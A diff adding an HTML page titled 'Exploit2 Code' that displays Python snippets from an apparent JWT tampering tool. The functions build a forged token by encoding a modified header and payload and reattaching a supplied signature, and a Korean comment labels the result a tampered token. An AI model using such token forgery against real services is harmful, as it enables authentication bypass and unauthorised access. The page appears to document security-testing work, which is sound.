@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit2 Code</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@400;700&display=swap">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.querySelectorAll('pre code').forEach((block) => {
+                hljs.highlightBlock(block);
+            });
+        });
+    </script>
+    <style>
+        pre {
+            background-color: #f8f8f8;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: 'Sans-serif', monospace; /* 폰트 변경 */
+            line-height: 1.6; /* 텍스트 간격 증가 */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Exploit2 Code</h2>
+
+        <pre><code class="python">
+token2 = autojwt.exploit2(mheader, mpayload, signature)
+        </code></pre>
+
+        <pre><code class="python">
+def exploit2(header, payload, signature):
+    modifiedToken = create_jwt(header, payload, signature=signature) #변조한 토큰 생성
+    return modifiedToken
+        </code></pre>
+
+        <pre><code class="python">
+def create_jwt(header, payload, signature):
+    algorithm = header.get('alg')
+
+    encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
+    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
+    created_token = f"{encoded_header}.{encoded_payload}.{signature}"
+    return created_token
+        </code></pre>
+    </div>
+</body>
+</html>
